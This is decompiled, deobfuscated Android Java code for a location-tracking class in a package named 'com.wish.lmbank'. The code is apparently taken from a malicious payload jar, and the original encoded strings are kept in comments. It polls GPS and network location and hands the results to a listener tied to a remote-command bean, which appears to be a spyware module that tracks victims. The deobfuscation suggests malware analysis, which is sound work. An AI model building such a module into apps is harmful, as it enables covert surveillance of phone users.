package com.wish.lmbank.location;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.location.Location;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.text.TextUtils;

import com.wish.lmbank.bean.CommandLocationBean;
import com.wish.lmbank.utils.LogUtils;

import java.util.HashSet;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager.class */
public class LocationManager {
    private static final long GET_LASTKNOWN_LOCATION_THRESHOLD = 360000;
    private static final long GPS_DELAY_TIME = 3000;
    private static final long GPS_TIMEOUT_TIME = 45000;
    private static final float LOCATION_UPDATE_MIN_DISTANCE = 10.0f;
    private static final long LOCATION_UPDATE_MIN_TIME = 60000;
    private static final long LOCATION_VALID_TIME = 600000;
    private static final String TAG = "LocationManager";
    private ContentResolver mContentResolver;
    private Context mContext;
    private GPSContentObserver mGPSContentObserver;
    private Runnable mGPSRunnable;
    private Runnable mGPSTimeoutRunnable;
    private Handler mHandler;
    private HandlerThread mHandlerThread;
    private long mLastGetLocationTime = 0;
    private android.location.LocationManager mLocationManager = null;
    private boolean mbPaused = false;
    private UpdateLocationListener mUpdateLocationListen = null;
    //     private LocationListener[] mLocationListeners = {new LocationListener(this, bb7d7pu7.m5998("Dhka")), new LocationListener(this, bb7d7pu7.m5998("BwwdHgYbAg"))};
    private LocationListener[] mLocationListeners = {new LocationListener(this, "gps"), new LocationListener(this, "network")};
    private CommandLocationBean mLocationMsg = null;

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager$UpdateLocationListener.class */
    public interface UpdateLocationListener {
        boolean isLocationPermissionAllowed();

        void onLocationUpdated(Location location, boolean z);
    }

    private boolean allowNetworkAccess() {
        return true;
    }

    public LocationManager(Context context) {
        this.mContext = null;
        this.mContentResolver = null;
        this.mGPSContentObserver = null;
        this.mHandler = null;
        this.mGPSRunnable = null;
        this.mGPSTimeoutRunnable = null;
        this.mContext = context;
        this.mContentResolver = context.getApplicationContext().getContentResolver();
        this.mGPSContentObserver = new GPSContentObserver(this, new Handler());
//         HandlerThread handlerThread = new HandlerThread(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwbIQgHDQUMGz0BGwwIDQ"));
        HandlerThread handlerThread = new HandlerThread("LocationManagerHandlerThread");
        this.mHandlerThread = handlerThread;
        handlerThread.start();
        this.mHandler = new Handler(this.mHandlerThread.getLooper());
        this.mGPSRunnable = new GPSRunnable(this);
        this.mGPSTimeoutRunnable = new GPSTimeoutRunnable(this);
    }

    public void seUpdateLocationListen(UpdateLocationListener updateLocationListener) {
        this.mUpdateLocationListen = updateLocationListener;
    }

    public Location getCurrentLocation() {
        int i = 0;
        while (true) {
            LocationListener[] locationListenerArr = this.mLocationListeners;
            if (i >= locationListenerArr.length) {
//                 LogUtils.v(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb"), bb7d7pu7.m5998("DgwdKhwbGwwHHSUGCggdAAYHRUknBkkFBgoIHQAGB0kbDAoMAB8MDUkQDB1H"));
                LogUtils.v("LocationManager", "getCurrentLocation, No location received yet.");
                return null;
            }
            Location current = locationListenerArr[i].current();
            if (current != null) {
                return current;
            }
            i++;
        }
    }

    public void onResume() {
        this.mbPaused = false;
        if (this.mContext == null || !allowNetworkAccess()) {
            return;
        }
        if (System.currentTimeMillis() - this.mLastGetLocationTime >= LOCATION_VALID_TIME) {
//             LogUtils.v(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb"), bb7d7pu7.m5998("Bgc7DBocBAxFSQUGCggdAAYHSQAaSQAHHwgFAA0"));
            LogUtils.v("LocationManager", "onResume, location is invalid");
            LocationListener[] locationListenerArr = this.mLocationListeners;
            if (locationListenerArr[0] != null) {
                locationListenerArr[0].setLocaValid(false);
            }
            LocationListener[] locationListenerArr2 = this.mLocationListeners;
            if (locationListenerArr2[1] != null) {
                locationListenerArr2[1].setLocaValid(false);
            }
        }
        updateRecordLocation();
    }

    public void onPause() {
//         LogUtils.v(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb"), bb7d7pu7.m5998("Bgc5CBwaDA"));
        LogUtils.v("LocationManager", "onPause");
        this.mbPaused = true;
        removeHandlerCallbacks();
        stopLocaUpdates();
        ContentResolver contentResolver = this.mContentResolver;
        if (contentResolver == null) {
            return;
        }
        GPSContentObserver gPSContentObserver = this.mGPSContentObserver;
        if (gPSContentObserver == null) {
            return;
        }
        contentResolver.unregisterContentObserver(gPSContentObserver);
    }

    public void onDestroy() {
        onPause();
        this.mbPaused = true;
        this.mLocationListeners = null;
        this.mLocationManager = null;
        this.mContext = null;
        this.mGPSContentObserver = null;
        this.mContentResolver = null;
        this.mHandler = null;
        this.mGPSRunnable = null;
        this.mGPSTimeoutRunnable = null;
        this.mUpdateLocationListen = null;
        HandlerThread handlerThread = this.mHandlerThread;
        if (handlerThread != null) {
            handlerThread.quitSafely();
            this.mHandlerThread = null;
            return;
        }
    }

    public void updateRecordLocation() {
//         LogUtils.v(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb"), bb7d7pu7.m5998("HBkNCB0MOwwKBhsNJQYKCB0ABgc"));
        LogUtils.v("LocationManager", "updateRecordLocation");
        UpdateLocationListener updateLocationListener = this.mUpdateLocationListen;
        if (updateLocationListener != null && updateLocationListener.isLocationPermissionAllowed() && allowNetworkAccess()) {
            startLocaUpdates();
        }
    }

    @SuppressLint("MissingPermission")
    private void startLocaUpdates() {
        Location lastKnownLocation;
        //             String m5998 = bb7d7pu7.m5998("Gh0IGx0lBgoIPBkNCB0MGg");
        String m5998 = "startLocaUpdates";
//             String m59982 = bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb");
        String m59982 = "LocationManager";
        LogUtils.v(m59982, m5998);
        if (this.mLocationManager == null) {
//                 this.mLocationManager = (android.location.LocationManager) this.mContext.getApplicationContext().getSystemService(bb7d7pu7.m5998("BQYKCB0ABgc"));
            this.mLocationManager = (android.location.LocationManager) this.mContext.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        }
        android.location.LocationManager locationManager = this.mLocationManager;
//             String m59983 = bb7d7pu7.m5998("BwwdHgYbAg");
        String m59983 = "network";
        if (locationManager != null && (lastKnownLocation = locationManager.getLastKnownLocation(m59983)) != null && this.mUpdateLocationListen != null && System.currentTimeMillis() - lastKnownLocation.getTime() < GET_LASTKNOWN_LOCATION_THRESHOLD) {
//                 LogUtils.v(m59982, bb7d7pu7.m5998("Gh0IGx0lBgoIPBkNCB0MGkVJDgwdJQgaHSIHBh4HJQYKCB0ABgc"));
            LogUtils.v(m59982, "startLocaUpdates, getLastKnownLocation");
            this.mUpdateLocationListen.onLocationUpdated(lastKnownLocation, true);
        }
        android.location.LocationManager locationManager2 = this.mLocationManager;
        if (locationManager2 != null) {
            boolean isProviderEnabled = locationManager2.isProviderEnabled(m59983);
//                 LogUtils.v(m59982, bb7d7pu7.m5998("Gh0IGx0lBgoIPBkNCB0MGkVJBx0ZLAcICwUMU0k") + isProviderEnabled);
            LogUtils.v(m59982, "startLocaUpdates, ntpEnable: " + isProviderEnabled);
            if (isProviderEnabled) {
                try {
//                         this.mLocationManager.requestLocationUpdates(bb7d7pu7.m5998("BwwdHgYbAg"), LOCATION_UPDATE_MIN_TIME, LOCATION_UPDATE_MIN_DISTANCE, this.mLocationListeners[1], Looper.getMainLooper());
                    this.mLocationManager.requestLocationUpdates("network", LOCATION_UPDATE_MIN_TIME, LOCATION_UPDATE_MIN_DISTANCE, this.mLocationListeners[1], Looper.getMainLooper());
                } catch (IllegalArgumentException e) {
//                         LogUtils.d(m59982, bb7d7pu7.m5998("Gh0IGx0lBgoIPBkNCB0MGkVJGRsGHwANDBtJDQYMGkkHBh1JDBEAGh0") + e.getMessage());
                    LogUtils.d(m59982, "startLocaUpdates, provider does not exist" + e.getMessage());
                } catch (SecurityException e2) {
//                         LogUtils.i(m59982, bb7d7pu7.m5998("Gh0IGx0lBgoIPBkNCB0MGkVJDwgABUkdBkkbDBgcDBodSQUGCggdAAYHSRwZDQgdDA"), e2);
                    LogUtils.i(m59982, "startLocaUpdates, fail to request location update", e2);
                }
                this.mHandler.postDelayed(this.mGPSRunnable, GPS_DELAY_TIME);
                return;
            }
            startGpsLocaUpdates();
            return;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startGpsLocaUpdates() {
        StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("Gh0IGx0uGRolBgoIPBkNCB0MGkVJBCgKHQAfAB0QU0k"));
        sb.append("startGpsLocaUpdates, mActivity: ");
        sb.append(this.mContext);
//             sb.append(bb7d7pu7.m5998("RUkECzkIHBoMDVNJ"));
        sb.append(", mbPaused: ");
        sb.append(this.mbPaused);
        String sb2 = sb.toString();
//             String m5998 = bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb");
        String m5998 = "LocationManager";
        LogUtils.v(m5998, sb2);
        Context context = this.mContext;
        if (context == null || this.mbPaused) {
            return;
        }
        if (this.mLocationManager == null) {
//                 this.mLocationManager = (android.location.LocationManager) context.getApplicationContext().getSystemService(bb7d7pu7.m5998("BQYKCB0ABgc"));
            this.mLocationManager = (android.location.LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        }
        android.location.LocationManager locationManager = this.mLocationManager;
        if (locationManager != null) {
//                 @SuppressLint("MissingPermission") Location lastKnownLocation = locationManager.getLastKnownLocation(bb7d7pu7.m5998("Dhka"));
            @SuppressLint("MissingPermission") Location lastKnownLocation = locationManager.getLastKnownLocation("gps");
            if (lastKnownLocation != null && this.mUpdateLocationListen != null && System.currentTimeMillis() - lastKnownLocation.getTime() < GET_LASTKNOWN_LOCATION_THRESHOLD) {
//                     LogUtils.v(m5998, bb7d7pu7.m5998("Gh0IGx0uGRolBgoIPBkNCB0MGkVJDgwdJQgaHSIHBh4HJQYKCB0ABgc"));
                LogUtils.v(m5998, "startGpsLocaUpdates, getLastKnownLocation");
                this.mUpdateLocationListen.onLocationUpdated(lastKnownLocation, true);
            }
        }
        this.mHandler.post(new Runnable() { // from class: com.wish.lmbank.location.LocationManager.1

            @SuppressLint("MissingPermission")
            @Override // java.lang.Runnable
            public void run() {
//                     String m59982 = bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb");
                String m59982 = "LocationManager";
                try {
//                         LogUtils.d(m59982, bb7d7pu7.m5998("Gh0IGx0uGRolBgoIPBkNCB0MGkVJGwwYHAwaHSUGCggdAAYHPBkNCB0MGkkZBhodSR0GSQEIBw0FDBtJHQEbDAgN"));
                    LogUtils.d(m59982, "startGpsLocaUpdates, requestLocationUpdates post to handler thread");
//                         this.this$0.mLocationManager.requestLocationUpdates(bb7d7pu7.m5998("Dhka"), LocationManager.LOCATION_UPDATE_MIN_TIME, LocationManager.LOCATION_UPDATE_MIN_DISTANCE, this.this$0.mLocationListeners[0], Looper.getMainLooper());
                    LocationManager.this.mLocationManager.requestLocationUpdates("gps", LocationManager.LOCATION_UPDATE_MIN_TIME, LocationManager.LOCATION_UPDATE_MIN_DISTANCE, LocationManager.this.mLocationListeners[0], Looper.getMainLooper());
                } catch (IllegalArgumentException e) {
//                         LogUtils.e(m59982, bb7d7pu7.m5998("Gh0IGx0uGRolBgoIPBkNCB0MGkVJGRsGHwANDBtJDQYMGkkHBh1JDBEAGh0") + e.getMessage());
                    LogUtils.e(m59982, "startGpsLocaUpdates, provider does not exist" + e.getMessage());
                } catch (SecurityException e2) {
//                         LogUtils.e(m59982, bb7d7pu7.m5998("Gh0IGx0uGRolBgoIPBkNCB0MGkVJDwgABUkdBkkbDBgcDBodSQUGCggdAAYHSRwZDQgdDA"), e2);
                    LogUtils.e(m59982, "startGpsLocaUpdates, fail to request location update", e2);
                }
                if (LocationManager.this.mHandler != null) {
                    LocationManager.this.mHandler.postDelayed(LocationManager.this.mGPSTimeoutRunnable, LocationManager.GPS_TIMEOUT_TIME);
                }
//                     LogUtils.v(m59982, bb7d7pu7.m5998("Gh0IGx0uGRolBgoIPBkNCB0MGkVJGQYaHUkuOTpJHQAEDAYcHUkbHAcHCAsFDA"));
                LogUtils.v(m59982, "startGpsLocaUpdates, post GPS timeout runnable");
            }
        });
    }

    @SuppressLint("MissingPermission")
    private void stopLocaUpdates() {
        if (this.mLocationManager == null) {
            return;
        }
        int i2 = 0;
        while (true) {
            LocationListener[] locationListenerArr = this.mLocationListeners;
            int length = locationListenerArr.length;
//                 String m5998 = bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb");
            String m5998 = "LocationManager";
            if (i2 < length) {
                try {
                    this.mLocationManager.removeUpdates(locationListenerArr[i2]);
                } catch (Exception e) {
//                         LogUtils.v(m5998, bb7d7pu7.m5998("Gh0GGSUGCgg8GQ0IHQwaRUkPCAAFSR0GSRsMBAYfDEkFBgoIHQAGB0kFABodBwwbGg"), e);
                    LogUtils.v(m5998, "stopLocaUpdates, fail to remove location listners", e);
                }
                i2++;
            } else {
//                     LogUtils.v(m5998, bb7d7pu7.m5998("Gh0GGSUGCgg8GQ0IHQwa"));
                LogUtils.v(m5998, "stopLocaUpdates");
                return;
            }
        }

    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager$GPSRunnable.class */
    public static class GPSRunnable implements Runnable {
        final LocationManager this$0;

        public GPSRunnable(LocationManager locationManager) {
            this.this$0 = locationManager;
        }

        @Override // java.lang.Runnable
        public void run() {
            if (this.this$0.mLocationListeners == null || this.this$0.getCurrentLocation() != null || this.this$0.mbPaused) {
                return;
            }
            this.this$0.startGpsLocaUpdates();
        }
    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager$GPSTimeoutRunnable.class */
    public static class GPSTimeoutRunnable implements Runnable {
        final LocationManager this$0;

        public GPSTimeoutRunnable(LocationManager locationManager) {
            this.this$0 = locationManager;
        }

        @Override // java.lang.Runnable
        public void run() {
            this.this$0.stopGpsLocaUpdates();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager$GPSContentObserver.class */
    public static class GPSContentObserver extends ContentObserver {
        final LocationManager this$0;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        public GPSContentObserver(LocationManager locationManager, Handler handler) {
            super(handler);
            this.this$0 = locationManager;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager$LocationListener.class */
    public static class LocationListener implements android.location.LocationListener {
        private Location mLastLocation;
        private String mProvider;
        private boolean mbValid = false;
        final LocationManager this$0;

        @Override // android.location.LocationListener
        public void onProviderEnabled(String str) {
        }

        public LocationListener(LocationManager locationManager, String str) {
            this.this$0 = locationManager;
            this.mProvider = str;
            this.mLastLocation = new Location(this.mProvider);
        }

        public void setLocaValid(boolean z) {
            this.mbValid = z;
        }

        @Override // android.location.LocationListener
        public void onLocationChanged(Location location) {
            if (location.getLatitude() == 0.0d && location.getLongitude() == 0.0d) {
                return;
            }
            boolean z = this.this$0.mbPaused;
//                 String m5998 = bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb");
            String m5998 = "LocationManager";
            if (z) {
//                     LogUtils.v(m5998, bb7d7pu7.m5998("BgclBgoIHQAGByoBCAcODA1JCA8dDBtJGQgcGgxFSRoGSRsMHRwbBw"));
                LogUtils.v(m5998, "onLocationChanged after pause, so return");
                return;
            }
//                 LogUtils.d(m5998, bb7d7pu7.m5998("JQYKCB0ABgclABodDAcMG0VJBgclBgoIHQAGByoBCAcODA1FSQQ5GwYfAA0MG1NJ") + this.mProvider + bb7d7pu7.m5998("RUkECz8IBQANU0k") + this.mbValid);
            LogUtils.d(m5998, "LocationListener, onLocationChanged, mProvider: " + this.mProvider + ", mbValid: " + this.mbValid);
            this.this$0.mLastGetLocationTime = System.currentTimeMillis();
            this.mLastLocation.set(location);
            this.mbValid = true;
            if (this.this$0.mUpdateLocationListen != null) {
                this.this$0.mUpdateLocationListen.onLocationUpdated(location, false);
            }
            this.this$0.stopGpsLocaUpdates();
            return;
        }

        @Override // android.location.LocationListener
        public void onProviderDisabled(String str) {
//             LogUtils.v(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb"), bb7d7pu7.m5998("Bgc5GwYfAA0MGy0AGggLBQwNRUkECz8IBQANU0k") + this.mbValid);
            LogUtils.v("LocationManager", "onProviderDisabled, mbValid: " + this.mbValid);
            this.mbValid = false;
        }

        @Override // android.location.LocationListener
        public void onStatusChanged(String str, int i, Bundle bundle) {
            StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("Bgc6HQgdHBoqAQgHDgwNRUkaHQgdHBpTSQ"));
            sb.append("onStatusChanged, status: ");
            sb.append(i);
//             sb.append(bb7d7pu7.m5998("RUkECz8IBQANU0k"));
            sb.append(", mbValid: ");
            sb.append(this.mbValid);
//             LogUtils.v(bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb"), sb.toString());
            LogUtils.v("LocationManager", sb.toString());
            if (i == 0) {
                this.mbValid = false;
            }
        }

        public Location current() {
            return !this.mbValid ? null : this.mLastLocation;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void stopGpsLocaUpdates() {
        //             String m5998 = bb7d7pu7.m5998("JQYKCB0ABgckCAcIDgwb");
        String m5998 = "LocationManager";
        removeHandlerCallbacks();
        android.location.LocationManager locationManager = this.mLocationManager;
        if (locationManager != null) {
            LocationListener[] locationListenerArr = this.mLocationListeners;
            if (locationListenerArr[0] == null) {
                return;
            }
            try {
                locationManager.removeUpdates(locationListenerArr[0]);
            } catch (Exception e) {
//                     LogUtils.v(m5998, bb7d7pu7.m5998("Gh0GGS4ZGiUGCgg8GQ0IHQwaRUkPCAAFSR0GSRsMBAYfDEkFBgoIHQAGB0kFABodDAcMGxo"), e);
                LogUtils.v(m5998, "stopGpsLocaUpdates, fail to remove location listeners", e);
            }
//                 LogUtils.v(m5998, bb7d7pu7.m5998("Gh0GGS4ZGiUGCgg8GQ0IHQwaSTE"));
            LogUtils.v(m5998, "stopGpsLocaUpdates X");
            return;
        }
    }

    private void removeHandlerCallbacks() {
        Handler handler = this.mHandler;
        if (handler != null) {
            handler.removeCallbacks(this.mGPSRunnable);
            this.mHandler.removeCallbacks(this.mGPSTimeoutRunnable);
            return;
        }
    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/location/LocationManager$CameraAddress.class */
    public static class CameraAddress {
        public String mSubThoroughfare = null;
        public String mThoroughfare = null;
        public String mSubLocality = null;
        public String mLocality = null;
        public String mSubAdminArea = null;
        public String mAdminArea = null;
        public String mCountry = null;
        public String mCountryCode = null;
        public Location mLocation = null;

        public void setCountry(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mCountry = str;
            }
        }

        public void setAdminArea(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mAdminArea = str;
            }
        }

        public void setSubAdminArea(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mSubAdminArea = str;
            }
        }

        public void setLocality(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mLocality = str;
            }
        }

        public void setSubLocality(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mSubLocality = str;
            }
        }

        public void setThoroughfare(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mThoroughfare = str;
            }
        }

        public void setSubThoroughfare(String str) {
            if (TextUtils.isEmpty(str) || !getLocationNameSet().contains(str)) {
                this.mSubThoroughfare = str;
            }
        }

        public void setCountryCode(String str) {
            this.mCountryCode = str;
        }

        private HashSet<String> getLocationNameSet() {
            HashSet<String> hashSet = new HashSet<>();
            hashSet.add(this.mCountry);
            hashSet.add(this.mAdminArea);
            hashSet.add(this.mSubAdminArea);
            hashSet.add(this.mLocality);
            hashSet.add(this.mSubLocality);
            hashSet.add(this.mThoroughfare);
            hashSet.add(this.mSubThoroughfare);
            return hashSet;
        }

        public String toString() {
            StringBuilder sb = new StringBuilder();
            sb.append(this.mCountry);
//                 String m5998 = bb7d7pu7.m5998("Ng");
            String m5998 = "_";
            sb.append(m5998);
            sb.append(this.mAdminArea);
            sb.append(m5998);
            sb.append(this.mSubAdminArea);
            sb.append(m5998);
            sb.append(this.mLocality);
            sb.append(m5998);
            sb.append(this.mSubLocality);
            sb.append(m5998);
            sb.append(this.mThoroughfare);
            sb.append(m5998);
            sb.append(this.mSubThoroughfare);
            sb.append(m5998);
            return sb.toString();
        }
    }
}
